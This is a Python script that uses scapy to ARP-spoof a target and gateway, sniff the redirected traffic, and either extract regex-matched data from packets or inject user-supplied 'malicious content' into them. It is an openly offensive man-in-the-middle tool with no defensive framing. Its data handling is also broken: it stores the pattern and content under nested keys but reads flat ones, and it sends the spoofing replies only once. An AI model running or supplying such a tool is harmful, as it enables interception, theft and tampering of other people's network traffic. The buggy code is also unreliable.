from scapy.all import ARP, Ether, IP, send, srp, sniff, wrpcap
import os
import re

def mitm_attack(target_ip, gateway_ip, interface, action, data=None):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def arp_spoof(target, gateway):
        target_mac = get_mac(target)
        gateway_mac = get_mac(gateway)
        send(ARP(op=2, psrc=gateway, pdst=target, hwdst=target_mac))
        send(ARP(op=2, psrc=target, pdst=gateway, hwdst=gateway_mac))

    def get_mac(ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip), timeout=2, iface=interface, verbose=0)
        if ans:
            return ans[0][1].hwsrc
        else:
            return None

    def packet_processor(packet):
        if packet.haslayer(IP):
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            print(f"Intercepted packet from {ip_src} to {ip_dst}")
            print(f"Packet details: {packet.summary()}")
            print(f"Packet content: {packet.show()}\n")

            if action == 'modify':
                if ip_dst == target_ip:
                    packet[IP].dst = data['new_dst']
                    send(packet)
            elif action == 'extract':
                if ip_dst == target_ip:
                    extracted_data = re.search(data['pattern'], str(packet))
                    if extracted_data:
                        print(f"Extracted data: {extracted_data.group(0)}\n")
            elif action == 'inject':
                if ip_dst == target_ip:
                    packet[IP].payload.load += data['malicious_content']
                    send(packet)

    print("Starting ARP spoofing...")
    arp_spoof(target_ip, gateway_ip)

    print("Sniffing packets...")
    sniff(iface=interface, prn=packet_processor, store=0)

target_ip = input("Enter the target IP: ")
gateway_ip = input("Enter your gateway IP: ")
interface = input("Enter your network interface: ")

action = input("Do you want to inject or extract? (inject/extract): ").strip().lower()

if action not in ['inject', 'extract']:
    print("Invalid action. Please choose either 'inject' or 'extract'.")
else:
    if action == 'extract':
        pattern = input("Enter the pattern to extract: ")
        data = {'extract': {'pattern': pattern}}
    elif action == 'inject':
        malicious_content = input("Enter the malicious content to inject: ")
        data = {'inject': {'malicious_content': malicious_content}}

    mitm_attack(target_ip, gateway_ip, interface, action, data)